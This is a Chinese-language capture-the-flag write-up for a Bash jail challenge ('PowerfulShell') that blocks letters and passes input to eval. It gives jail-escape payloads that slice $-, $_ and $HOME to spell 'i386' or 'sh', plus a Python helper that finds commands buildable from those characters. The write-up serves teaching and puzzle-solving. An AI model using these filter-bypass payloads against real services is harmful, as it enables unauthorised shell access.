# PowerfulShell

一道 Bash Jail 类型的题，严格限制了可用字符，所有输入会经过字符检查，如果包含禁用字符则退出，合法输入会被 `eval` 执行。

```bash
#!/bin/bash

FORBIDDEN_CHARS="'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"

PowerfulShell() {
    while true; do
        echo -n 'PowerfulShell@hackergame> '
        if ! read input; then
            echo "EOF detected, exiting..."
            break
        fi
        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then
            echo "Not Powerful Enough :)"
            exit
        else
            eval $input
        fi
    done
}

PowerfulShell
```

关键限制：

- 禁用了所有字母 (`a-z, A-Z`)
- 禁用了常用的通配符 (`*, ?`)
- 禁用了引号 (`', "`)
- 禁用了分隔符 (`;, .`)
- 禁用了数字 `0`

可用字符：

- 空格：用于分隔命令
- `$`：变量引用
- `+-`：算术运算
- `123456789`：数字
- `:`：用于字符串操作
- `=`： 赋值操作
- `[]{}|`：用于命令替换和管道
- `_`：下划线
- `` ` ``：命令替换
- `~`：家目录

## 非预期解

在测试各种可用[Shell 变量 (Shell Variables)](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables) 和 [特殊参数 (Special Parameters)](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters)，我发现两个变量的值中包含了被禁用的字符：

- `$-`: `hB`
- `$_`: `input`

`$-` 是 Shell 选项标志 (option flags)，`h` (hashall) 表示记住命令的位置，`B` (braceexpand) 表示启用大括号拓展。

`$_` 是上一个命令的最后一个参数，即 `eval $input` 语句中的 `input`。

那么我们可以通过字符串切片获得 `hBinput` 字符任意数量排列组合的命令，例如：

- `php`: `${_:2:1}${-::1}${_:2:1}`
- `pip`: `${_:2:1}${_::1}${_:2:1}`
- `init`: `${_::2}${_::1}${_:4:1}`
- `h2ph`: `${-::1}2${_:2:1}${-::1}`

可惜靶机环境缺少这些命令，无法直接使用。于是我编写了一个脚本，用来查找本地系统中所有仅由这些可用字符组成的命令，并自动生成对应的构造表达式：

```python
import os
from pathlib import Path

allowed = set("hBinput123456789-")
option_flags = "hB"  # $-
last_arg = "input"  # $_


def char_to_expr(c: str) -> str:
    if c.isdigit():
        return c
    if c in option_flags:
        return f"${{-:{option_flags.index(c) or ''}:1}}"
    if c in last_arg:
        return f"${{_:{last_arg.index(c) or ''}:1}}"
    return ""


commands = {
    cmd.name
    for path in os.environ["PATH"].split(":")
    if os.path.exists(path)
    for cmd in Path(path).iterdir()
    if os.access(cmd, os.X_OK) and set(cmd.name) <= allowed
}

for cmd in sorted(commands):
    expr = "".join(char_to_expr(c) for c in cmd)
    print(f"{cmd}:\t{expr}")
```

结果：

```
h2ph:   ${-::1}2${_:2:1}${-::1}
i386:   ${_::1}386
init:   ${_::1}${_:1:1}${_::1}${_:4:1}
ip:     ${_::1}${_:2:1}
php:    ${_:2:1}${-::1}${_:2:1}
tput:   ${_:4:1}${_:2:1}${_:3:1}${_:4:1}
```

`tput` 是一个用于控制终端输出格式的命令，没有什么用。

`i386` 是 `setarch` 命令的符号链接，`setarch` 包含在 [util-linux](https://github.com/util-linux/util-linux) 包中，用于改变程序运行时的系统架构环境。

例如在 AMD64 (x86_64) 系统上，运行 `i386 command` 会使得 `command` 看到的系统架构是 `i686` 而不是 `x86_64`。

更重要的是，根据 man page 的说明，如果不指定要运行的程序，`setarch` 会默认运行 `/bin/sh`：

```
The execution domains currently only affects the output of uname -m.
For example, on an AMD64 system, running setarch i386 program will
cause program to see i686 instead of x86_64 as the machine type. It can
also be used to set various personality options. The default program is
/bin/sh.
```

这意味着直接运行 `i386` 命令就能获得一个完整的 shell 环境：

```
PowerfulShell@hackergame> ${_::1}386
id
uid=1000(players) gid=1000(players) groups=1000(players)
```

另外：那么为什么会有一个 `i386` 链接到 `setarch` 呢？

在源码的 [478-479 行](https://github.com/util-linux/util-linux/blob/4e14b5731efcd703ad13e24362448c87cecb5424/sys-utils/setarch.c#L478-L480)中写道，如果程序名不是 `setarch`，就认为是通过符号链接调用的，这时会把程序名当作目标架构名：

```c
archwrapper = strcmp(program_invocation_short_name, "setarch") != 0;
if (archwrapper) {
    arch = program_invocation_short_name;	/* symlinks to setarch */
```

你可以看到系统中还存在其他许多符号链接：

```
 find /usr/bin -type l -lname '*setarch*' 2>/dev/null
/usr/bin/i386
/usr/bin/linux32
/usr/bin/linux64
/usr/bin/uname26
/usr/bin/x86_64
```

## 预期解

预期解是利用 `$HOME` 变量值 `/players` 中的 `s` 字符，与 `$-` 变量值 `hB` 中的 `h` 组合构造出 `sh`。

`~` 会被扩展为 `$HOME` 变量，所以将 `~` 赋值给符合 Bash 命名规则的新变量，再对它进行切片：

```bash
_1=~                    # /players
_2=$-                   # hB
${_1:7:1}${_2: -2:1}    # sh
```

直接使用 `${~:7:1}` 是不行的，比赛中我这里卡了一下，所以放弃了这种解法。

来看看 AI 朋友的解释：

> 在 bash 中，`${parameter:offset:length}` 语法用于字符串切片，其中 `parameter`:
>
> 可以是变量名（如 `$HOME`, `$PATH`）
> 可以是特殊参数（如 `$@`, `$*`, `$#`, `$-`, `$_`）
> 必须是一个有效的参数引用
>
> `~` 不是一个变量或参数名，它是一个特殊字符：
>
> 作为命令的第一个字符时，bash 会将其扩展为 `$HOME` 的值
> 但在参数扩展语法 `${...}` 中，它不会被识别为一个有效的参数名
>
> 因此需要两步操作：
>
> 先将 `~` 赋值给一个变量，这时 bash 会进行扩展，变量获得 `$HOME` 的值
> 然后对这个变量进行切片操作
